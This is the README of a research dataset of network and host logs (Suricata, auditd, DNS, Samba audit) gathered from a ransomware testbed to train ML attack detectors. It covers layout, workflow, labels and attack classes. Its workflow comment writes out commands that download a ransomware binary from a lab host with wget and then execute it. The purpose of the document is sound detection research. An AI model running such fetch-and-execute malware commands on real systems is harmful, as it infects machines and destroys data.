# Dataset Collection

Network and host logs collected from the RansomwareTestbed for ML-based attack detection.

## Directory Structure

```
dataset/
├── labels.jsonl          # attack time windows — written by scripts/run_attack.sh
├── dataset.csv           # final labeled dataset — written by scripts/export_dataset.py
└── logs/
    ├── <timestamp>_<run_name>/       # one dir per collection run
    │   ├── gateway1/
    │   │   ├── eve-flow.json         # all network flows (bytes, duration, ports)
    │   │   ├── eve-alert.json        # Suricata IDS/IPS rule hits
    │   │   ├── eve-dns.json          # DNS queries and responses
    │   │   ├── eve-http.json         # HTTP requests (URL, method, status, UA)
    │   │   ├── eve-tls.json          # TLS connections (SNI, cipher, cert subject)
    │   │   ├── eve-smb.json          # SMB file operations (lateral movement)
    │   │   ├── eve-anomaly.json      # protocol violations and malformed packets
    │   │   └── fast.log              # human-readable alert summary
    │   ├── <client_ip>/
    │   │   ├── audit.log             # auditd: rename, execve, connect, file access
    │   │   ├── syslog
    │   │   └── auth.log
    │   ├── dns1/
    │   │   └── query.log             # every DNS query with timestamp
    │   ├── dhcp1/
    │   │   ├── syslog
    │   │   └── kea-leases4.csv       # IP→MAC mapping for host correlation
    │   ├── backup1/
    │   │   └── syslog                # Samba VFS full_audit (LOCAL7 facility)
    │   └── web1/
    │       └── access.log
    └── ...
```

## Workflow

```bash
# ── STEP 1: Testbed setup (run once via site.yml — logging included) ──────────
ansible-playbook -i inventory/hosts.ini playbooks/site.yml
# configure_logging.yml runs automatically at the end of site.yml.
# Installs auditd on clients, enables DNS query log, Samba VFS audit on backup1.
# After this, all VMs log continuously to their local /var/log/.

# ── STEP 2: Run experiments (researcher does this manually) ──────────────────
# SSH to client and run attacks however you want:
#   ssh -J admin@173.168.0.10 student@10.10.20.151
#   wget http://173.168.0.50/download-gonnacry/ -O /tmp/gonnacry
#   chmod +x /tmp/gonnacry && /tmp/gonnacry
#
# Note the start and end time of each attack run.

# ── STEP 3: After each test run — collect logs from all systems ───────────────
ansible-playbook -i inventory/hosts.ini playbooks/collect_logs.yml -e run_name=gonnacry
ansible-playbook -i inventory/hosts.ini playbooks/collect_logs.yml -e run_name=baseline
ansible-playbook -i inventory/hosts.ini playbooks/collect_logs.yml -e run_name=nmap_scan
# Each run creates: dataset/logs/<timestamp>_<run_name>/

# ── STEP 4: Add attack time windows to labels file ────────────────────────────
# Append one line per experiment to dataset/labels.jsonl:
echo '{"attack":"gonnacry","start":"2026-08-07T14:30:00+05:30","end":"2026-08-07T14:40:00+05:30","exit_code":0}' \
    >> dataset/labels.jsonl

# ── STEP 5: Build labeled CSV for ML ─────────────────────────────────────────
python3 scripts/export_dataset.py
# Output: dataset/dataset.csv
```

## Label Format (`labels.jsonl`)

One JSON line per attack run:
```json
{"attack": "gonnacry", "start": "2026-08-07T10:30:00+05:30", "end": "2026-08-07T10:35:00+05:30", "exit_code": 0}
{"attack": "baseline", "start": "2026-08-07T10:00:00+05:30", "end": "2026-08-07T10:25:00+05:30", "exit_code": 0}
```

Events whose timestamp falls inside a window get that attack's name as label. Everything outside → `benign`.

## Dataset Columns (`dataset.csv`)

| Column | Source | Description |
|--------|--------|-------------|
| `timestamp` | all | ISO8601 event time |
| `source` | all | host that generated the event |
| `event_type` | all | `flow`, `alert`, `http`, `dns`, `smb`, `auditd_*` |
| `src_ip` / `dest_ip` | network | connection endpoints |
| `src_port` / `dest_port` | network | ports |
| `proto` / `app_proto` | network | TCP/UDP, http/smb/dns/tls |
| `bytes_toserver` / `bytes_toclient` | flow | traffic volume per direction |
| `pkts_toserver` / `pkts_toclient` | flow | packet counts |
| `flow_duration` | flow | seconds |
| `http_url` / `http_method` / `http_status` | HTTP | request details |
| `dns_query` / `dns_type` / `dns_rcode` | DNS | query name and result |
| `alert_signature` / `alert_category` / `alert_severity` | alert | IDS rule hit |
| `syscall` / `exe` / `key` | auditd | system call name, binary path, rule key |
| `path_src` / `path_dst` | auditd | file paths involved in rename/open |
| `label` | derived | attack class or `benign` |

## Attack Classes

| Label | What it captures |
|-------|-----------------|
| `baseline` | Normal enterprise traffic — backups, DNS, DHCP, web browsing |
| `gonnacry` | Full ransomware: C2 beacon, key exchange, local encryption, lateral SMB |
| `nmap_scan` | Network reconnaissance — SYN scan across infra/client subnets |
| `sql_injection` | Web exploitation against web1 |
| `ssh_brute_force` | Credential stuffing against SSH port 22 |

Add new attack classes freely — `run_attack.sh` accepts any name.
